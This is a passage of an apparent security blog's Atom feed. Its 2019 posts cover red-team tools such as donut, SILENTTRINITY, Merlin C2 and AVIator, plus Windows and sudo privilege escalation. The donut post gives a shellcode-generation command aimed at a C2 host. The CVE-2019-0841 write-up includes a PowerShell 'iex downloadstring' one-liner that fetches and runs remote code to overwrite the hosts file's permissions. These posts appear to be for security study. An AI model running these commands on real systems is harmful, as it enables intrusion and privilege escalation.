+    <link href="www.ggsec.cn/Salsa-tools.html"/>
+    <id>www.ggsec.cn/Salsa-tools.html</id>
+    <published>2019-06-07T04:57:32.000Z</published>
+    <updated>2019-06-07T05:17:45.000Z</updated>
+    
+    <content type="html"><![CDATA[<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/594C87D5728DB6A42D0A7398DC6AEE66.jpg" alt="enter description here"></p><a id="more"></a><h2 id="视频演示："><a href="#视频演示：" class="headerlink" title="视频演示："></a>视频演示：</h2><p><div style="width:640px;height:480px;margin:0 auto;" id="ivaLive"></div></p><script type="text/javascript" src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/cytron.core.js"></script><script>    var ivaInstance = new Iva('ivaLive', {        appkey: 'By9WGzBIx', //应用标示        video: 'https://demonsec666.oss-cn-qingdao.aliyuncs.com/salsa-tools.mp4', //视频        title: 'test', //视频标题，后台视频管理中的标题        cover: '' //视频封面，只有在autoplay:false才可生效    });</script><script src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/lva.js"></script><p>感谢WGBIII编译的dll文件<br><a href="https://github.com/Hackplayers/Salsa-tools" target="_blank" rel="noopener">https://github.com/Hackplayers/Salsa-tools</a><br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/C5F144C7-3202-4D25-A2BA-D427879AD9CE.png" alt="enter description here"></p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;&lt;img src=&quot;https://demonsec666.oss-cn-qingdao.aliyuncs.com/594C87D5728DB6A42D0A7398DC6AEE66.jpg&quot; alt=&quot;enter description here&quot;&gt;&lt;/p&gt;
+    
+    </summary>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>comhijack&amp;meterpreter</title>
+    <link href="www.ggsec.cn/comhijack&amp;meterpreter.html"/>
+    <id>www.ggsec.cn/comhijack&amp;meterpreter.html</id>
+    <published>2019-06-01T01:09:25.000Z</published>
+    <updated>2019-06-01T01:19:14.000Z</updated>
+    
+    <content type="html"><![CDATA[<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/IMG_20190601_090053.jpg" alt="enter description here"></p><a id="more"></a><h2 id="视频演示："><a href="#视频演示：" class="headerlink" title="视频演示："></a>视频演示：</h2><p><div style="width:640px;height:480px;margin:0 auto;" id="ivaLive"></div></p><script type="text/javascript" src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/cytron.core.js"></script><script>    var ivaInstance = new Iva('ivaLive', {        appkey: 'By9WGzBIx', //应用标示        video: 'https://demonsec666.oss-cn-qingdao.aliyuncs.com/comhijack.mp4', //视频        title: 'test', //视频标题，后台视频管理中的标题        cover: '' //视频封面，只有在autoplay:false才可生效    });</script><script src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/lva.js"></script><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/3FF3ECB3EB2FC4EE3BCD10E8CEA98832.jpg" alt="enter description here"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/5F86D7C50E44008A19ECC7A018C27C96.jpg" alt="enter description here"></p><p><a href="https://www.mdsec.co.uk/2019/05/persistence-the-continued-or-prolonged-existence-of-something-part-2-com-hijacking/" target="_blank" rel="noopener">https://www.mdsec.co.uk/2019/05/persistence-the-continued-or-prolonged-existence-of-something-part-2-com-hijacking/</a><br>感谢 WBG的改良使得脚本更加完善</p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;&lt;img src=&quot;https://demonsec666.oss-cn-qingdao.aliyuncs.com/IMG_20190601_090053.jpg&quot; alt=&quot;enter description here&quot;&gt;&lt;/p&gt;
+    
+    </summary>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>donut</title>
+    <link href="www.ggsec.cn/donut.html"/>
+    <id>www.ggsec.cn/donut.html</id>
+    <published>2019-05-13T11:17:01.000Z</published>
+    <updated>2019-05-13T11:26:05.000Z</updated>
+    
+    <content type="html"><![CDATA[<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/IMG_20190513_190748.jpg" alt="enter description here"><br><a id="more"></a></p><h2 id="视频演示："><a href="#视频演示：" class="headerlink" title="视频演示："></a>视频演示：</h2><p><div style="width:640px;height:480px;margin:0 auto;" id="ivaLive"></div></p><script type="text/javascript" src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/cytron.core.js"></script><script>    var ivaInstance = new Iva('ivaLive', {        appkey: 'By9WGzBIx', //应用标示        video: 'https://demonsec666.oss-cn-qingdao.aliyuncs.com/donut.mp4', //视频        title: 'test', //视频标题，后台视频管理中的标题        cover: '' //视频封面，只有在autoplay:false才可生效    });</script><script src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/lva.js"></script><p><a href="https://thewover.github.io/Introducing-Donut/" target="_blank" rel="noopener">https://thewover.github.io/Introducing-Donut/</a><br><a href="https://github.com/TheWover/donut/" target="_blank" rel="noopener">https://github.com/TheWover/donut/</a><br><a href="https://github.com/TheWover/donut/releases/tag/v0.9" target="_blank" rel="noopener">https://github.com/TheWover/donut/releases/tag/v0.9</a><br><a href="https://github.com/byt3bl33d3r/SILENTTRINITY" target="_blank" rel="noopener">https://github.com/byt3bl33d3r/SILENTTRINITY</a><br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> .\donut<span class="selector-class">.exe</span> -<span class="selector-tag">a</span> <span class="number">1</span> -f .\SILENTTRINITY_DLL<span class="selector-class">.dll</span> -c ST -m Main -<span class="selector-tag">p</span> http:<span class="comment">//192.168.10.125:80</span></span><br><span class="line"> .\donut<span class="selector-class">.exe</span> -<span class="selector-tag">a</span> <span class="number">2</span> -f .\SILENTTRINITY_DLL<span class="selector-class">.dll</span> -c ST -m Main -<span class="selector-tag">p</span> http:<span class="comment">//192.168.10.125:80</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$filename</span>=<span class="string">"C:\Users\demon\Desktop\payload.bin"</span></span><br><span class="line">[convert]::ToBase64String([IO.File]::ReadAllBytes($filename)) | clip</span><br></pre></td></tr></table></figure></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/CD15D3B049938642D012504E1A16285C.jpg" alt="enter description here"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/67C730933F6BBBF12572A4E54BE29EC5.jpg" alt="enter description here"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1E2238E15A7540C565774F279974CEAC.jpg" alt="enter description here"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/C86DC2516ABBF56F8D18036A1B438515.jpg" alt="enter description here"></p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;&lt;img src=&quot;https://demonsec666.oss-cn-qingdao.aliyuncs.com/IMG_20190513_190748.jpg&quot; alt=&quot;enter description here&quot;&gt;&lt;br&gt;
+    
+    </summary>
+    
+      <category term="windows" scheme="www.ggsec.cn/categories/windows/"/>
+    
+    
+      <category term="windows" scheme="www.ggsec.cn/tags/windows/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>AVIator</title>
+    <link href="www.ggsec.cn/AVIator.html"/>
+    <id>www.ggsec.cn/AVIator.html</id>
+    <published>2019-04-29T12:49:32.000Z</published>
+    <updated>2019-05-13T11:26:00.000Z</updated>
+    
+    <content type="html"><![CDATA[<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/IMG_20190429_202921.jpg" alt="enter description here"><br><a id="more"></a></p><h2 id="视频演示："><a href="#视频演示：" class="headerlink" title="视频演示："></a>视频演示：</h2><p><div style="width:640px;height:480px;margin:0 auto;" id="ivaLive"></div></p><script type="text/javascript" src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/cytron.core.js"></script><script>    var ivaInstance = new Iva('ivaLive', {        appkey: 'By9WGzBIx', //应用标示        video: 'https://demonsec666.oss-cn-qingdao.aliyuncs.com/AVIator.mp4', //视频        title: 'test', //视频标题，后台视频管理中的标题        cover: '' //视频封面，只有在autoplay:false才可生效    });</script><script src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/lva.js"></script><p><a href="https://github.com/Ch0pin/AVIator" target="_blank" rel="noopener">https://github.com/Ch0pin/AVIator</a></p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;&lt;img src=&quot;https://demonsec666.oss-cn-qingdao.aliyuncs.com/IMG_20190429_202921.jpg&quot; alt=&quot;enter description here&quot;&gt;&lt;br&gt;
+    
+    </summary>
+    
+      <category term="windows" scheme="www.ggsec.cn/categories/windows/"/>
+    
+    
+      <category term="windows" scheme="www.ggsec.cn/tags/windows/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>wikipedia-c2</title>
+    <link href="www.ggsec.cn/wikipedia-c2.html"/>
+    <id>www.ggsec.cn/wikipedia-c2.html</id>
+    <published>2019-04-14T15:30:05.000Z</published>
+    <updated>2019-05-13T11:25:56.000Z</updated>
+    
+    <content type="html"><![CDATA[<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/IMG_20190414_232230.jpg" alt="enter description here"><br><a id="more"></a></p><h2 id="视频演示："><a href="#视频演示：" class="headerlink" title="视频演示："></a>视频演示：</h2><p><div style="width:640px;height:480px;margin:0 auto;" id="ivaLive"></div></p><script type="text/javascript" src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/cytron.core.js"></script><script>    var ivaInstance = new Iva('ivaLive', {        appkey: 'By9WGzBIx', //应用标示        video: 'https://demonsec666.oss-cn-qingdao.aliyuncs.com/wikipedia-c2.mp4', //视频        title: 'test', //视频标题，后台视频管理中的标题        cover: '' //视频封面，只有在autoplay:false才可生效    });</script><script src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/lva.js"></script><p><a href="https://github.com/dweezy-netsec/wikipedia-c2" target="_blank" rel="noopener">https://github.com/dweezy-netsec/wikipedia-c2</a><br><a href="https://dweezy-netsec.github.io/blog/wikipediac2/" target="_blank" rel="noopener">https://dweezy-netsec.github.io/blog/wikipediac2/</a></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/2D53BA3275211C9FD9C5EA76468CDDC6.jpg" alt="enter description here"></p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;&lt;img src=&quot;https://demonsec666.oss-cn-qingdao.aliyuncs.com/IMG_20190414_232230.jpg&quot; alt=&quot;enter description here&quot;&gt;&lt;br&gt;
+    
+    </summary>
+    
+      <category term="windows" scheme="www.ggsec.cn/categories/windows/"/>
+    
+    
+      <category term="windows" scheme="www.ggsec.cn/tags/windows/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>sudo_inject</title>
+    <link href="www.ggsec.cn/sudo-inject.html"/>
+    <id>www.ggsec.cn/sudo-inject.html</id>
+    <published>2019-04-13T23:32:43.000Z</published>
+    <updated>2019-06-10T13:56:22.000Z</updated>
+    
+    <content type="html"><![CDATA[<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/IMG_20190414_073022.jpg" alt="enter description here"><br><a id="more"></a><br><a href="https://github.com/nongiach/sudo_inject" target="_blank" rel="noopener">https://github.com/nongiach/sudo_inject</a></p><h2 id="1-执行作者的exp"><a href="#1-执行作者的exp" class="headerlink" title="1.执行作者的exp"></a>1.执行作者的exp</h2><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1555198998849.jpg" alt="enter description here"></p><h2 id="2-观察sudo的结构体"><a href="#2-观察sudo的结构体" class="headerlink" title="2.观察sudo的结构体"></a>2.观察sudo的结构体</h2><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1555200616310.jpg" alt="enter description here"></p><p>1.sudo ls等于获取权限<br>2.sudo id 可以看到sudo等于获取root权限<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1555200312715.jpg" alt="enter description here"><br>3.sudo -i 等于获取root权限并以root权限使用shell登录</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1555200580261.jpg" alt="enter description here"></p><p>4.作者在以上基础增加修改 进行sudo注入<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1555200349172.jpg" alt="enter description here"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1555200906444.jpg" alt="enter description here"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/8F38B224551D2A7C519AEC2328D365F0.jpg" alt="enter description here"></p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;&lt;img src=&quot;https://demonsec666.oss-cn-qingdao.aliyuncs.com/IMG_20190414_073022.jpg&quot; alt=&quot;enter description here&quot;&gt;&lt;br&gt;
+    
+    </summary>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>Merlin</title>
+    <link href="www.ggsec.cn/merlin.html"/>
+    <id>www.ggsec.cn/merlin.html</id>
+    <published>2019-04-13T13:25:17.000Z</published>
+    <updated>2019-04-13T13:29:36.000Z</updated>
+    
+    <content type="html"><![CDATA[<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/0EBBC533E071635742CC4ABA76DAEA75.jpg" alt="enter description here"><br><a id="more"></a></p><h2 id="视频演示："><a href="#视频演示：" class="headerlink" title="视频演示："></a>视频演示：</h2><p><div style="width:640px;height:480px;margin:0 auto;" id="ivaLive"></div></p><script type="text/javascript" src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/cytron.core.js"></script><script>    var ivaInstance = new Iva('ivaLive', {        appkey: 'By9WGzBIx', //应用标示        video: 'https://demonsec666.oss-cn-qingdao.aliyuncs.com/merlin.mp4', //视频        title: 'test', //视频标题，后台视频管理中的标题        cover: '' //视频封面，只有在autoplay:false才可生效    });</script><script src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/lva.js"></script><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/3E558E905B40769BE910FFD6421DD5AA.jpg" alt="enter description here"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/AE2A2E613179B47DAC33CDEA738A1265.jpg" alt="enter description here"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/959E6CAEAF583385A4E9D2A13B6A4EBE.jpg" alt="enter description here"><br>相关链接：<a href="https://github.com/Ne0nd0g/merlin" target="_blank" rel="noopener">https://github.com/Ne0nd0g/merlin</a><br><a href="https://posts.specterops.io/merlin-v0-7-0-release-roll-up-717739cde77a" target="_blank" rel="noopener">https://posts.specterops.io/merlin-v0-7-0-release-roll-up-717739cde77a</a></p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;&lt;img src=&quot;https://demonsec666.oss-cn-qingdao.aliyuncs.com/0EBBC533E071635742CC4ABA76DAEA75.jpg&quot; alt=&quot;enter description here&quot;&gt;&lt;br&gt;
+    
+    </summary>
+    
+      <category term="windows" scheme="www.ggsec.cn/categories/windows/"/>
+    
+    
+      <category term="windows" scheme="www.ggsec.cn/tags/windows/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>DACL权限覆盖提权(CVE-2019-0841)</title>
+    <link href="www.ggsec.cn/CVE-2019-084.html"/>
+    <id>www.ggsec.cn/CVE-2019-084.html</id>
+    <published>2019-04-11T09:39:47.000Z</published>
+    <updated>2019-04-11T11:30:43.000Z</updated>
+    
+    <content type="html"><![CDATA[<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/IMG_20190411_174224.jpg" alt="enter description here"><br><a id="more"></a></p><h2 id="视频演示："><a href="#视频演示：" class="headerlink" title="视频演示："></a>视频演示：</h2><p><div style="width:640px;height:480px;margin:0 auto;" id="ivaLive"></div></p><script type="text/javascript" src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/cytron.core.js"></script><script>    var ivaInstance = new Iva('ivaLive', {        appkey: 'By9WGzBIx', //应用标示        video: 'https://demonsec666.oss-cn-qingdao.aliyuncs.com/CVE-2019-0841.mp4', //视频        title: 'test', //视频标题，后台视频管理中的标题        cover: '' //视频封面，只有在autoplay:false才可生效    });</script><script src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/lva.js"></script><h2 id="1-背景CVE-2019-0841"><a href="#1-背景CVE-2019-0841" class="headerlink" title="1.背景CVE-2019-0841"></a>1.背景CVE-2019-0841</h2><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1554975988336.jpg" alt="enter description here"></p><h2 id="2-硬链接"><a href="#2-硬链接" class="headerlink" title="2.硬链接"></a>2.硬链接</h2><p>我们首先看下什么是硬链接。<br><a href="https://krbtgt.pw/dacl-permissions-overwrite-privilege-escalation-cve-2019-0841/" target="_blank" rel="noopener">https://krbtgt.pw/dacl-permissions-overwrite-privilege-escalation-cve-2019-0841/</a><br>1.首先我们使用作者提到的谷歌项目中的CreateHardlink.exe 创建硬链接<br>2.我们创建两个文本文件 一个(src.txt)源文件 一个(target.txt)目标文件。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1554976232642.jpg" alt="enter description here"></p><p>3.检查两份文本文档 HASH值。我们并且可以看到两者HASH值相同。.<img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1554976406874.jpg" alt="enter description here"></p><p>4.改变target.txt文本文档 HASH值，随即写入该txt文字。并检查两者HASH值。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1554976548397.jpg" alt="enter description here" title="可以看到两者HASH值已变化"></p><p>5.那么我们开始创建硬链接<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1554976657156.jpg" alt="enter description here" title="我们可以看到两者HASH 随着target的hash变化而变化"></p><p>6.我们可以看到两者HASH 随着target的hash变化而变化，并在任意两者txt文件中随即写入文字都内容相同。</p><h2 id="3-分析作者博文中的内容"><a href="#3-分析作者博文中的内容" class="headerlink" title="3.分析作者博文中的内容."></a>3.分析作者博文中的内容.</h2><p>1.首先事出因Windows AppX中 setting.dat文件 由硬链接处理不当导致的权限覆盖。并由于该文件由NT AUTHORITY\SYSTEM将使用该文件，并且作为低权限用户，您可以完全访问该文件。</p><p>2 settings.dat 存储位置 C:\Users\<username>\AppData\Local\Packages\<packagename>.<img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1554977003403.jpg" alt="enter description here"><br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1554977112874.jpg" alt="enter description here" title="可以看到权限为system"></packagename></username></p><p>3.如果settings.dat 文件损坏，则删除该文件，并由“C:\Windows\System32\settings.dat”，复制到该目录重置。并重启该应用则可重置。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1554977219647.jpg" alt="enter description here"></p><p>4 最后作者利用自己写的漏洞进行复现<img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1554978682616.jpg" alt="enter description here"></p><ol start="5"><li><p>过程</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1554978752002.jpg" alt="enter description here"><br>1.检查要是用setting.dat的应用是否启用，如果是将其结束，因该应用开始则创建不了硬链接<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1554978935388.jpg" alt="enter description here"></p><p>2.检查目标文件是否有低权限，如果有则可创建。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1554979069769.jpg" alt="enter description here"></p><p>3.创建硬链接<br>1.未结束该使用的应用 setting.dat  (MicrosoftEdge)<br>2.已结束该使用的应用 setting.dat  MicrosoftEdge)<br>3.创建完硬链接后，检查权限未发生变化<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1554979252964.jpg" alt="enter description here"></p></li></ol><p> 4.修复权限，启动应用(MicrosoftEdge)<br> <img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1554979575137.jpg" alt="enter description here"></p><h2 id="4-拓展-powershell"><a href="#4-拓展-powershell" class="headerlink" title="4.拓展(powershell)"></a>4.拓展(powershell)</h2><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/D3xwjxYWsAM8Tca.jpg" alt="enter description here"></p><p><a href="https://twitter.com/rogue_kdc/status/1115664188821639173" target="_blank" rel="noopener">https://twitter.com/rogue_kdc/status/1115664188821639173</a><br>已向原作者和其他开发者提出该拓展<br><a href="https://pastebin.com/jXaz8xMx" target="_blank" rel="noopener">https://pastebin.com/jXaz8xMx</a><br><a href="https://gist.github.com/xillwillx/0377cb2284fa82edb4d2975bab585c45" target="_blank" rel="noopener">https://gist.github.com/xillwillx/0377cb2284fa82edb4d2975bab585c45</a><br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1554979806898.jpg" alt="enter description here"></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">iex (New-Object net.webclient).downloadstring(<span class="string">'https://github.com/FuzzySecurity/PowerShell-Sui</span></span><br><span class="line">te/raw/master/Native-HardLink.ps1');</span><br><span class="line">start microsoft-edge:;get-process -name MicrosoftEdge | Stop-process;sleep 2;Native-HardLink -</span><br><span class="line">Link c:\users\username\appdata\local\packages\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\settings\settings<span class="selector-class">.dat</span> -target c:\windows</span><br><span class="line">\system32\drivers\etc\hosts;start microsoft-edge:;get-process -name Microsoftedge | stop-process</span><br></pre></td></tr></table></figure><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iex (New-Object net.webclient).downloadstring('https://github.com/FuzzySecurity/PowerShell-Suite/raw/master/Native-HardLink.ps1');start microsoft-edge:;get-process -name MicrosoftEdge | Stop-process;sleep 2;Native-HardLink -Link "$env:localappdata\packages\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\settings\settings.dat" -target "$env:windir\system32\drivers\etc\hosts";start microsoft-edge:;get-process -name Microsoftedge | stop-process</span><br></pre></td></tr></table></figure><p>参考链接：<a href="https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-0841" target="_blank" rel="noopener">https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-0841</a><br><a href="https://krbtgt.pw/dacl-permissions-overwrite-privilege-escalation-cve-2019-0841/" target="_blank" rel="noopener">https://krbtgt.pw/dacl-permissions-overwrite-privilege-escalation-cve-2019-0841/</a><br><a href="https://pastebin.com/jXaz8xMx" target="_blank" rel="noopener">https://pastebin.com/jXaz8xMx</a></p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;&lt;img src=&quot;https://demonsec666.oss-cn-qingdao.aliyuncs.com/IMG_20190411_174224.jpg&quot; alt=&quot;enter description here&quot;&gt;&lt;br&gt;
+    
+    </summary>
+    
+      <category term="windows" scheme="www.ggsec.cn/categories/windows/"/>
+    
+    
+      <category term="windows" scheme="www.ggsec.cn/tags/windows/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>CVE-2018-20250</title>
+    <link href="www.ggsec.cn/CVE-2018-20250.html"/>
+    <id>www.ggsec.cn/CVE-2018-20250.html</id>
+    <published>2019-03-07T10:36:38.000Z</published>
+    <updated>2019-03-07T10:44:43.000Z</updated>
+    
+    <content type="html"><![CDATA[<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/IMG_20190307_184210.jpg" alt="enter description here"><br><a id="more"></a></p><h2 id="视频演示："><a href="#视频演示：" class="headerlink" title="视频演示："></a>视频演示：</h2><p><div style="width:640px;height:480px;margin:0 auto;" id="ivaLive"></div></p><script type="text/javascript" src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/cytron.core.js"></script><script>    var ivaInstance = new Iva('ivaLive', {        appkey: 'By9WGzBIx', //应用标示        video: 'https://demonsec666.oss-cn-qingdao.aliyuncs.com/CVE-2018-20250.mp4', //视频        title: 'test', //视频标题，后台视频管理中的标题        cover: '' //视频封面，只有在autoplay:false才可生效    });</script><script src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/lva.js"></script><p><a href="https://research.checkpoint.com/extracting-code-execution-from-winrar/" target="_blank" rel="noopener">https://research.checkpoint.com/extracting-code-execution-from-winrar/</a><br><a href="https://github.com/manulqwerty/Evil-WinRAR-Gen" target="_blank" rel="noopener">https://github.com/manulqwerty/Evil-WinRAR-Gen</a><br><a href="https://github.com/360-A-Team/CVE-2018-20250/blob/master/ace.bt" target="_blank" rel="noopener">https://github.com/360-A-Team/CVE-2018-20250/blob/master/ace.bt</a></p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;&lt;img src=&quot;https://demonsec666.oss-cn-qingdao.aliyuncs.com/IMG_20190307_184210.jpg&quot; alt=&quot;enter description here&quot;&gt;&lt;br&gt;
+    
+    </summary>
+    
+    
+  </entry>
+  
+</feed>
